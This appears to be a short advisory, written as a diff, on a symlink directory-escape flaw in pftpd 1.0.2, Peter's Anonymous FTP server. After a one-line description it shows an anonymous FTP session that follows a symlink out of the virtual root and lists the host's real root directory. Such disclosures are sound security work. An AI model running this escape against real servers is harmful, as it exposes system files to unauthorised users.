@@ -1,0 +1,64 @@
+Peters Anonymous FTP server (found in FreeBSD ports) attempts to restrict
+anonymous users to a virtual root path, however the code does not check if
+a requested file is a symlink and allows to escape the directory traversal
+check.
+
+$ ftp localhost
+Trying 127.0.0.1...
+ftp: connect to address 127.0.0.1: Connection refused
+Trying ::1...
+Connected to localhost.
+220 Peter's Anonymous FTP server (pftpd 1.0.2 at Oct 21 2010 20:19:54) ready.
+Name (localhost:user): ftp
+331 Guest login ok; use your e-mail address as password.
+Password:
+230 Login OK.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd /
+250 Command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||56490|)
+150 Opening BINARY mode data connection for file listing.
+drwxr-xr-x   2 root     wheel        512 Oct 21 20:42 .
+lrwxr-xr-x   1 root     wheel          1 Oct 21 20:42 blah -> /
+226 Transfer complete.
+ftp> cd ..
+250 Command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||31462|)
+150 Opening BINARY mode data connection for file listing.
+drwxr-xr-x   2 root     wheel        512 Oct 21 20:42 .
+lrwxr-xr-x   1 root     wheel          1 Oct 21 20:42 blah -> /
+226 Transfer complete.
+ftp> cd blah
+250 Command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||63502|)
+150 Opening BINARY mode data connection for file listing.
+drwxr-xr-x  20 root     wheel        512 Oct 21 21:03 .
+drwxr-xr-x  20 root     wheel        512 Oct 21 21:03 ..
+drwxr-xr-x   2 root     wheel       1024 Jul 19 03:24 bin
+drwxr-xr-x   7 root     wheel       1024 Oct 21 21:02 boot
+drwxr-xr-x   2 root     wheel        512 Oct 21 20:58 cdrom
+dr-xr-xr-x   7 root     wheel        512 Oct 21 21:16 dev
+drwxr-xr-x   2 root     wheel        512 Oct 21 20:58 dist
+drwxr-xr-x  20 root     wheel       2048 Oct 21 20:14 etc
+drwxr-xr-x   3 root     wheel       1536 Jul 19 03:24 lib
+drwxr-xr-x   2 root     wheel        512 Jul 19 03:24 libexec
+drwxr-xr-x   2 root     wheel        512 Jul 19 03:23 media
+drwxr-xr-x   2 root     wheel        512 Jul 19 03:23 mnt
+dr-xr-xr-x   2 root     wheel        512 Jul 19 03:23 proc
+drwxr-xr-x   2 root     wheel       2560 Jul 19 03:24 rescue
+drwxr-xr-x   2 root     wheel        512 Oct 21 20:23 root
+drwxr-xr-x   2 root     wheel       2560 Jul 19 03:24 sbin
+drwxrwxrwx   7 root     wheel        512 Oct 21 20:30 tmp
+drwxr-xr-x  17 root     wheel        512 Oct 21 21:03 usr
+drwxr-xr-x  23 root     wheel        512 Oct 21 21:17 var
+-r--r--r--   1 root     wheel       6206 Jul 19 03:25 COPYRIGHT
+lrwxr-xr-x   1 root     wheel         10 Oct 21 21:02 compat -> usr/compat
+lrwxr-xr-x   1 root     wheel          8 Oct 21 21:03 home -> usr/home
+lrwxr-xr-x   1 root     wheel         11 Jul 19 03:25 sys -> usr/src/sys
+226 Transfer complete.
+ftp> 
+
